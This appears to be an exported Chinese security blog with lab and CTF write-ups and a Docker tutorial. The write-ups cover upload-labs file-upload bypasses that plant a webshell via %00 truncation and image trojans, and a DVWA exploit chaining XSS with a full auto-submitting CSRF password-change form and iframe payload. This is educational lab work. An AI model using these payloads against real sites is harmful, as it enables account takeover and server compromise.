    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>继续前面没完成的upload-labs靶场练习</p>
<h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>源码中可以看到，是以白名单的形式进行过滤，并随机生成文件名，后添加文件后缀，保存在<code>$_GET[&#39;save_path&#39;]</code>路径下，这个是关键点，我们可以通过抓包修改路径，实现任意路径存放文件，当然我们本次目的是成功上传webshell。</p>
<p>如下图，我们抓包，改save_path=./upload/1.php%00，上传的文件依旧是1.jpg，保存的路径变成<code>./upload/1.php</code>,并对后面进行%00截断，这样他就会将我们上传的1.jpg的内容存到1.php里面<br><img src="/uploads/upl5.png" alt="1"></p>
<h2 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>与上一题类似，知识路径变成了post请求获得，我们依旧抓包改路径，并在hex里面进行0x00截断。<br><img src="/uploads/upl6.png" alt="1"><br><img src="/uploads/upl7.png" alt="1"></p>
<h2 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h2><p>本题目是制作图片木马，并上传。<br><img src="/uploads/upl8.png" alt="1"></p>
<p>或者可以抓包进行添加gif文件头，也可以绕过。<br><img src="/uploads/upl9.png" alt="1"><br>##</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types &#x3D; &#39;.jpeg|.png|.gif&#39;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info &#x3D; getimagesize($filename);</span><br><span class="line">        $ext &#x3D; image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $res &#x3D; isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types &#x3D; &#39;.jpeg|.png|.gif&#39;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info &#x3D; getimagesize($filename);</span><br><span class="line">        $ext &#x3D; image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $res &#x3D; isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>方法同pass-13</p>
<h2 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    &#x2F;&#x2F;需要开启php_exif模块</span><br><span class="line">    $image_type &#x3D; exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $res &#x3D; isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>方法同pass-13</p>
<h2 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">    $filetype &#x3D; $_FILES[&#39;upload_file&#39;][&#39;type&#39;];</span><br><span class="line">    $tmpname &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line"></span><br><span class="line">    $target_path&#x3D;$UPLOAD_ADDR.basename($filename);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 获得上传文件的扩展名</span><br><span class="line">    $fileext&#x3D; substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext &#x3D;&#x3D; &quot;jpg&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext &#x3D;&#x3D; &quot;png&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.png&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext &#x3D;&#x3D; &quot;gif&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefromgif($target_path);</span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本题目按照pass-13已经不能通过了，通过源码可知，他对图片进行了二次渲染，虽然图片木马能够上传成功，但是添加在后面的php脚本，被渲染掉了，所以我们直接将PHPdiamante插入到图片内部。虽然他会报错，但是文件是上传成功的，并且文件名也没有改变。<br><img src="/uploads/upl10.png" alt="1"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS与CSRF双剑合璧</title>
    <url>/2018/05/09/XSS%E4%B8%8ECSRF%E5%8F%8C%E5%89%91%E5%90%88%E7%92%A7/</url>
    <content><![CDATA[<h1 id="XSS与CSRF"><a href="#XSS与CSRF" class="headerlink" title="XSS与CSRF"></a>XSS与CSRF</h1><p>本次学习利用的环境是大家所熟悉的DVWA，其内集成了很多的漏洞环境，可以让我们更好的学习web安全，通过wamp配置好环境后，开始我们的学习！</p>
<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p><img src="/uploads/dvwa1.png" alt="1"><br>首先其中一个版块是关于CSRF的，由上图可以看出，该板块是提供了一个修改密码的功能，而如果攻击者伪造了一个页面，该页面会自动提交一个修改密码的表单，这时候管理员无意点击了改页面，就会造成CSRF攻击。</p>
<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p><img src="/uploads/dvwa2.png" alt="1"><br><img src="/uploads/dvwa3.png" alt="1"><br>该板块存在XSS漏洞，我们构造如上图的payload，然后提交，就弹窗了…</p>
<h2 id="CSRF与XSS联合利用"><a href="#CSRF与XSS联合利用" class="headerlink" title="CSRF与XSS联合利用"></a>CSRF与XSS联合利用</h2><p>我们首先构造一个自动提交表单的页面，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">            &lt;titile&gt;CSRF&lt;&#x2F;titile&gt;</span><br><span class="line">        &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form id&#x3D;&#39;csrftestform&#39; action&#x3D;&#39;http:&#x2F;&#x2F;192.168.0.8&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;csrf&#x2F;&#39; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">            &lt;input autocomplete&#x3D;&quot;off&quot; type&#x3D;&quot;hidden&quot; name&#x3D;&quot;password_new&quot; value&#x3D;&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="line">            &lt;input autocomplete&#x3D;&quot;off&quot; type&#x3D;&quot;hidden&quot; name&#x3D;&quot;password_conf&quot; value&#x3D;&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="line">            &lt;input name&#x3D;&quot;Change&quot; value&#x3D;&quot;Change&quot;&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            document.getElementById(&#39;csrftestform&#39;).submit();</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>该页面的作用就是生成表单，密码为password，并提交到<code>http://192.168.0.8/DVWA-master/vulnerabilities/csrf/</code>.</p>
<p>将该html文件放到www目录下.</p>
<p>在XSS页面构造payload:<code>&lt;iframe  src=&quot;http://127.0.0.1/csrf.html&quot;  </code>,将html文件通过xss响应.</p>
<p><img src="/uploads/dvwa4.png" alt="1"></p>
<p>然后我们就会发现密码已被改动，之前的密码无效了…<br><img src="/uploads/dvwa5.png" alt="1"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>CSRF</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>Slove me challenge</title>
    <url>/2018/03/28/challenge/</url>
    <content><![CDATA[<h1 id="Slove-me-challenge"><a href="#Slove-me-challenge" class="headerlink" title="Slove me challenge"></a>Slove me challenge</h1><p>大佬推荐的代码审计练习平台<a href="http://solveme.peng.kr/chall">http://solveme.peng.kr/chall</a></p>
<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>很基础的一道题，flag转16进制，进行字符反转，再将16进制转字符，最后base64加密。<br>我们只要按顺序逆回去就拿到flag了。<br>贴脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">s&#x3D;&#39;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D;&#39;</span><br><span class="line">a&#x3D;base64.b64decode(s).hex()[::-1]</span><br><span class="line">print(a)</span><br><span class="line">b&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,len(a),2):</span><br><span class="line">	k&#x3D;a[i:i+2]</span><br><span class="line">	b+&#x3D;chr(int(k,16))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>
<h2 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;answer&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">        if($_GET[&#39;answer&#39;] &#x3D;&#x3D;&#x3D; &#39;роВхУъесЧМ&#39;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;Wrong answer&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>当变量answer等于这个奇怪的字符串’роВхУъесЧМ’时，返回flag。<br>我们按照代码，直接构造answer=роВхУъесЧМ，显然是不能通过的，url参数传递过程，会被转码。我尝试将它转成16进制的url编码，但是也不行，我想可能是浏览器编码形式的原因，导致字符不准确，于是我用burpsuite repeater，直接获取页面字符，然后在里面编码，这次上传成功.<br><img src="/uploads/solve1.png" alt="图片"><br><img src="/uploads/solve2.png" alt="图片"></p>
<h2 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;time&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(!is_numeric($_GET[&#39;time&#39;]))&#123;</span><br><span class="line">            echo &#39;The time must be number.&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&#39;time&#39;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">            echo &#39;This time is too short.&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&#39;time&#39;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">            echo &#39;This time is too long.&#39;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            sleep((int)$_GET[&#39;time&#39;]);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析一下代码，意思要输入time在两个比较大的数之间，但是要经过time长的延时，才会返回flag，算了一下，怕是等不了那么长时间哦！<br>所以我们用另一种方法，科学计数法6e6在这两个数之间，同时(int)$_GET[‘time’]将time转制成int型，变成了6，只需要等6s就可以拿到flag啦！</p>
<p>未完待续。。。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker的环境部署</title>
    <url>/2018/06/10/docker%E7%9A%84%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>最近解锁了利用thinkphp框架搭建网站的成就，继续学习一波Docker，今天的任务就是将网站部署到Docker上。</p>
<h2 id="Docker是什么呢？"><a href="#Docker是什么呢？" class="headerlink" title="Docker是什么呢？"></a>Docker是什么呢？</h2><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。</p>
<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
<h2 id="Docker架构"><a href="#Docker架构" class="headerlink" title="Docker架构"></a>Docker架构</h2><p>镜像（ Image  ）<br>容器（ Container  ）<br>仓库（ Repository  ）</p>
<p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p>
<p>Docker 容器通过 Docker 镜像来创建。</p>
<p>容器与镜像的关系类似于面向对象编程中的对象与类。</p>
<h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>详细的配置方法，网上都有很多教程</p>
<p>为了方便起见，我们直接使用脚本自动安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh --mirror Aliyun</span><br><span class="line"></span><br><span class="line">执行这个命令后，脚本就会自动的将一切准备工作做好，并且把 Docker CE 的 Edge 版本安</span><br><span class="line">装在系统中。</span><br></pre></td></tr></table></figure>
<p>启动 Docker CE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl enable docker</span><br><span class="line">$ sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">Ubuntu 14.04 请使用以下命令启动：</span><br><span class="line">$ sudo service docker start</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo docker run hello-world</span><br></pre></td></tr></table></figure>
<p><img src="/uploads/docker1.png" alt="1"></p>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3><p>docker pull : 从镜像仓库中拉取或者更新指定镜像</p>
<p>docker images : 列出本地镜像。</p>
<p>docker build : 使用Dockerfile创建镜像。</p>
<h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><p>docker run ：创建一个新的容器并运行一个命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">--name&#x3D;&quot;nginx-lb&quot;: 为容器指定一个名称；</span><br><span class="line"></span><br><span class="line"># 交互式，创建一个容器, 本容器 80 端口映射到宿主机的 8080 端口上</span><br><span class="line">$ docker run -it --name bwapp_vul -p 0.0.0.0:8080:80 bwapp &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 后台式，创建一个容器, 本容器 80 端口映射到宿主机的 8080 端口上</span><br><span class="line">$ docker run -d --name bwapp_vul -p 0.0.0.0:8080:80 bwapp</span><br></pre></td></tr></table></figure>
<p>docker start :启动一个或多少已经被停止的容器</p>
<p>docker stop :停止一个运行中的容器</p>
<p>docker restart :重启容器</p>
<p>docker kill :杀掉一个运行中的容器。</p>
<p>docker rm ：删除一个或多少容器</p>
<p>docker create ：创建一个新的容器但不启动它</p>
<p>docker exec ：在运行的容器中执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it bwapp_vul bash</span><br><span class="line">进入容器bwapp_vul的shell模式。</span><br></pre></td></tr></table></figure>
<p>docker ps : 列出容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps : 列出正在运行的容器</span><br><span class="line">docker ps -a : 列出所有容器</span><br></pre></td></tr></table></figure>
<p>docker cp :用于容器与主机之间的数据拷贝。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp &#x2F;var&#x2F;www&#x2F;html&#x2F;blog bwapp_vul:&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">将本地blog拷贝到容器bwapp_vul下。</span><br></pre></td></tr></table></figure>
<h2 id="Dockerfile的编写"><a href="#Dockerfile的编写" class="headerlink" title="Dockerfile的编写"></a>Dockerfile的编写</h2><p>1.FROM<br>定义容器的基础系统来自哪个 image, 如: FROM ubuntu:14.04, image 仓库为 ubuntu tag 为 14.04的系统。</p>
<p>2.MAINTAINER<br>作者相关信息说明, 一般书写方式为: MAINTAINER &lt;作者名称&gt; &lt;作者邮箱地址&gt;</p>
<p>3.ADD<br>从宿主机拷贝文件到容器内, 一般格式: ADD ./lib /home/lib, 将当前目录下的 lib 目录中的内容拷贝到容器的 /home/lib/目录下。</p>
<p>4.RUN<br>在容器内运行命令, 如: RUN apt-get -y update。</p>
